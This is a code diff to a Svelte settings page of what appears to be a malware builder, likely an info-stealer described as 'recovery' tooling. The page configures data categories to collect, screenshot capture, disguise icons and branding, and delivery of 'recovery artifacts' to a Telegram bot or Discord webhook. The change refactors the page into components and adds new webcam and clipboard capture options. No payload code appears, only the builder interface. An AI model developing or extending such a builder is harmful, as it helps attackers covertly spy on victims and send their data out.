@@ -12,15 +12,14 @@
   import { Input } from "$lib/components/ui/input";
   import { Label } from "$lib/components/ui/label";
   import { Separator } from "$lib/components/ui/separator";
-  import { Switch } from "$lib/components/ui/switch";
   import { brandingPresets } from "$lib/branding-presets";
   import { toast } from "svelte-sonner";
+  import CommunicationSection from "./components/CommunicationSection.svelte";
+  import FeatureSection from "./components/FeatureSection.svelte";
   import {
-    FolderOpen,
     Hammer,
     KeyRound,
     LockKeyhole,
-    ListChecks,
     ShieldCheck,
   } from "@lucide/svelte";
 
@@ -78,8 +77,6 @@
   let telegramChatId = $state("");
   let discordWebhook = $state("");
   let commMode = $state<"telegram" | "discord">("telegram");
-  let telegramChecked = $state(true);
-  let discordChecked = $state(false);
   let outputDir = $state("");
   let iconSource = $state("");
   let iconPreset = $state("none");
@@ -93,6 +90,8 @@
     Object.fromEntries(categories.map((category) => [category.id, true]))
   );
   let captureScreenshots = $state(false);
+  let captureWebcams = $state(false);
+  let captureClipboard = $state(false);
 
   let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
   let buildError = $state("");
@@ -134,11 +133,6 @@
     }
   });
 
-  $effect(() => {
-    telegramChecked = commMode === "telegram";
-    discordChecked = commMode === "discord";
-  });
-
   const showToast = (message: string, title = "Notice", type: "info" | "error" = "info") => {
     if (type === "error") {
       toast.error(title, { description: message });
@@ -155,7 +149,33 @@
     categoryState = { ...categoryState, [id]: checked };
   };
 
-  const isCommInactive = (mode: "telegram" | "discord") => commMode !== mode;
+  const toggleScreenshots = () => {
+    captureScreenshots = !captureScreenshots;
+  };
+
+  const toggleWebcams = () => {
+    captureWebcams = !captureWebcams;
+  };
+
+  const toggleClipboard = () => {
+    captureClipboard = !captureClipboard;
+  };
+
+  const setCommunicationMode = (mode: "telegram" | "discord") => {
+    commMode = mode;
+  };
+
+  const handleTelegramTokenChange = (value: string) => {
+    telegramToken = value;
+  };
+
+  const handleTelegramChatIdChange = (value: string) => {
+    telegramChatId = value;
+  };
+
+  const handleDiscordWebhookChange = (value: string) => {
+    discordWebhook = value;
+  };
 
   const generateArtifactKey = () => {
     const bytes = new Uint8Array(32);
@@ -283,192 +303,30 @@
     </div>
   </CardHeader>
   <CardContent class="space-y-10">
-    <div class="space-y-4">
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
-        <ListChecks class="h-4 w-4 text-primary" />
-        Enabled categories
-      </div>
-      <p class="text-xs text-muted-foreground">
-        Toggle categories to include. At least one category is required.
-      </p>
-      <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
-        {#each categories as category}
-          <div
-            class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
-            role="button"
-            tabindex="0"
-            onclick={(event) => {
-              const target = event.target as HTMLElement | null;
-              if (target?.closest?.("[data-category-switch]")) return;
-              toggleCategory(category.id, !categoryState[category.id]);
-            }}
-            onkeydown={(event) => {
-              if (event.key === "Enter" || event.key === " ") {
-                event.preventDefault();
-                toggleCategory(category.id, !categoryState[category.id]);
-              }
-            }}
-          >
-            <Label class="text-sm">{category.label}</Label>
-            <Switch
-              id={`category-${category.id}`}
-              data-category-switch
-              class="cursor-pointer"
-              checked={categoryState[category.id]}
-              onclick={(event) => {
-                if (categoryState[category.id] && selectedCategoryCount <= 1) {
-                  event.preventDefault();
-                  event.stopPropagation();
-                  showToast("At least one category must stay enabled.");
-                }
-              }}
-              onCheckedChange={(checked) => toggleCategory(category.id, Boolean(checked))}
-            />
-          </div>
-        {/each}
-      </div>
-    </div>
+    <FeatureSection
+      {categories}
+      {categoryState}
+      {selectedCategoryCount}
+      {toggleCategory}
+      {showToast}
+      captureScreenshots={captureScreenshots}
+      captureWebcams={captureWebcams}
+      captureClipboard={captureClipboard}
+      onToggleScreenshots={toggleScreenshots}
+      onToggleWebcams={toggleWebcams}
+      onToggleClipboard={toggleClipboard}
+    />
 
-    <div class="space-y-3">
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
-        <ShieldCheck class="h-4 w-4 text-primary" />
-        Screen capture
-      </div>
-      <div class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/20 px-4 py-3 text-sm">
-        <div>
-          <p class="text-sm font-semibold">Capture screenshots</p>
-          <p class="text-xs text-muted-foreground">
-            Saves a screenshot of each connected monitor during recovery.
-          </p>
-        </div>
-        <Switch bind:checked={captureScreenshots} />
-      </div>
-    </div>
-
-    <div class="space-y-4">
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
-        <FolderOpen class="h-4 w-4 text-primary" />
-        Communication
-      </div>
-      <p class="text-xs text-muted-foreground">
-        Choose exactly one destination for sending recovery artifacts.
-      </p>
-      <div class="grid gap-4 md:grid-cols-2">
-        <div
-          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "telegram" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("telegram") ? "cursor-pointer opacity-50" : ""}`}
-          role="button"
-          tabindex="0"
-          onclick={() => {
-            if (commMode !== "telegram") {
-              commMode = "telegram";
-            }
-          }}
-          onkeydown={(event) => {
-            if (commMode === "telegram") return;
-            if (event.key === "Enter" || event.key === " ") {
-              event.preventDefault();
-              commMode = "telegram";
-            }
-          }}
-        >
-          <div class="flex items-center justify-between gap-3">
-            <div>
-              <p class="text-sm font-semibold">Telegram</p>
-              <p class="text-xs text-muted-foreground">Token + chat ID</p>
-            </div>
-            <Switch
-              bind:checked={telegramChecked}
-              onclick={(event) => event.stopPropagation()}
-              onCheckedChange={(checked) => {
-                commMode = checked ? "telegram" : "discord";
-              }}
-            />
-          </div>
-          <div class="space-y-2">
-            <Label class="text-xs text-muted-foreground" for="telegram-token">
-              Telegram Token
-            </Label>
-            <Input
-              id="telegram-token"
-              placeholder="123456789:ABC..."
-              bind:value={telegramToken}
-              disabled={commMode !== "telegram"}
-              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramTokenValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
-            />
-            {#if commMode === "telegram"}
-              <p class="text-xs text-muted-foreground">
-                Format: bot token like <span class="font-mono">123456789:ABCDEF...</span>
-              </p>
-            {/if}
-          </div>
-          <div class="space-y-2">
-            <Label class="text-xs text-muted-foreground" for="telegram-chat-id">
-              Telegram Chat ID
-            </Label>
-            <Input
-              id="telegram-chat-id"
-              placeholder="123456789"
-              bind:value={telegramChatId}
-              disabled={commMode !== "telegram"}
-              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramChatIdValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
-            />
-            {#if commMode === "telegram"}
-              <p class="text-xs text-muted-foreground">
-                Numeric chat ID (e.g. <span class="font-mono">123456789</span> or <span class="font-mono">-1001234567890</span>).
-              </p>
-            {/if}
-          </div>
-        </div>
-        <div
-          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "discord" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("discord") ? "cursor-pointer opacity-50" : ""}`}
-          role="button"
-          tabindex="0"
-          onclick={() => {
-            if (commMode !== "discord") {
-              commMode = "discord";
-            }
-          }}
-          onkeydown={(event) => {
-            if (commMode === "discord") return;
-            if (event.key === "Enter" || event.key === " ") {
-              event.preventDefault();
-              commMode = "discord";
-            }
-          }}
-        >
-          <div class="flex items-center justify-between gap-3">
-            <div>
-              <p class="text-sm font-semibold">Discord</p>
-              <p class="text-xs text-muted-foreground">Webhook URL</p>
-            </div>
-            <Switch
-              bind:checked={discordChecked}
-              onclick={(event) => event.stopPropagation()}
-              onCheckedChange={(checked) => {
-                commMode = checked ? "discord" : "telegram";
-              }}
-            />
-          </div>
-          <div class="space-y-2">
-            <Label class="text-xs text-muted-foreground" for="discord-webhook">
-              Discord Webhook URL
-            </Label>
-            <Input
-              id="discord-webhook"
-              placeholder="https://discord.com/api/webhooks/..."
-              bind:value={discordWebhook}
-              disabled={commMode !== "discord"}
-              class={`${commMode !== "discord" ? "pointer-events-none" : ""} ${!discordWebhookValid && commMode === "discord" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
-            />
-            {#if commMode === "discord"}
-              <p class="text-xs text-muted-foreground">
-                Full webhook URL like <span class="font-mono">https://discord.com/api/webhooks/…</span>
-              </p>
-            {/if}
-          </div>
-        </div>
-      </div>
-    </div>
+    <CommunicationSection
+      commMode={commMode}
+      setCommMode={setCommunicationMode}
+      telegramToken={telegramToken}
+      telegramChatId={telegramChatId}
+      discordWebhook={discordWebhook}
+      onTelegramTokenChange={handleTelegramTokenChange}
+      onTelegramChatIdChange={handleTelegramChatIdChange}
+      onDiscordWebhookChange={handleDiscordWebhookChange}
+    />
 
     <div class="space-y-3">
       <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
